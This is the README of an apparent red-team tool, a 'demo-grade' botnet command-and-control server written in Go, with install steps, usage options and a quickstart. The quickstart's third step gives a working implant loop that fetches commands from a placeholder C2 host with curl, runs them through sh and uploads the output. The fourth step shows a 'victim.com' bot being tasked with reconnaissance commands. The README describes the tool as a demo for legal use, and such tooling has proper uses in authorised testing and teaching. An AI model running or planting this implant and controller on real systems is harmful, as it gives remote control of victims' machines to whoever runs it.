demobotnetcontroller
====================
Demo-grade botnet controller

Features:
- Comms via HTTPS with a self-signed cert.
- Tasking and output via plaintext files.
- Bot-tracking via plaintext files' mtimes.
- Minimal documentation-caused confusion.
- Minimal distractions due to excessive (or any?) features.
- Exploit resistance via `pledge(2)` and `unveil(2)` (OpenBSD-only).
- Tests (probably mostly OpenBSD-only).
- ~Only tested~ Works well with curl in a loop.

For legal use only.

Quickstart
----------
1. Download/install
   ```sh
   go install github.com/magisterquis/demobotnetcontroller@latest
   ```
2. Start it going
   ```sh
   demobotnetcontroller -h # For good measure
   demobotnetcontroller
   {"time":"2025-10-31T01:52:03.556730378+01:00","level":"INFO","msg":"Server starting","fingerprint":"Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE=","address":"127.0.0.1:4433","PID":62063,"directory":"demobotnet","prefix":"/demobotnet/"}
   ```
3. TLS is self-signed.  Use the fingerprint and URL prefix from the first log
   message to roll an HTTPS/shell something, e.g.
   ```sh
   while :; do
   ( curl \
           --insecure \
           --pinnedpubkey sha256//Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE= \
           --silent \
           https://c2.example.com:4433/demobotnet/$(hostname)-$$ |
   sh 2>&1 |
   curl \
           --insecure \
           --pinnedpubkey sha256//Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE= \
           --silent \
           --upload-file - \
           https://c2.example.com:4433/demobotnet/$(hostname)-$$ ) &
   sleep 10
   done
   ```
4. Tasking and output are in the directory in the first log message.  Output
   is in a file named `something_out`.  Tasking goes in a file with the same
   name, without the `_out`.
   ```sh
   # Wait for the first request, which won't likely be logged.
   cd demobotnet && sleep 15 && ls -l
   victim.com_1234_out
   # Someone called back: we see a file named victim.com_1234_out.  We'll give
   # it the sort of tasking one should give a new bot.
   echo 'ps awwwfux; uname -a; id' >> victim.com_1234 # Not _out, for tasking
   # Watch for output
   tail -f victim.com_1234_out # Output goes in _out
   ```

Usage
-----
```
Usage: demobotnetcontroller [options]

Demo-grade botnet controller.

- Comms over HTTP, GET for tasking, POST/PUT for output.
- URL path must have the right prefix, last component is bot ID.
- IDs must be [A-Za-z0-9-.]+
- Tasking goes into files named after the bots' IDs.
- Output will go to files named after the bots' IDs plus _out.
- TLS Fingerprint (for --pinnedpubkey) is in _tls_fingerprint.

Options:
  -debug
    	Enable debug logging
  -dir directory
    	Bot tasking/output directory (default "demobotnet")
  -listen address
    	Listen address (default "0.0.0.0:4433")
  -max-runtime duration
    	Maximum run duration
  -prefix string
    	HTTP path prefix for bots (default "/demobotnet")
```
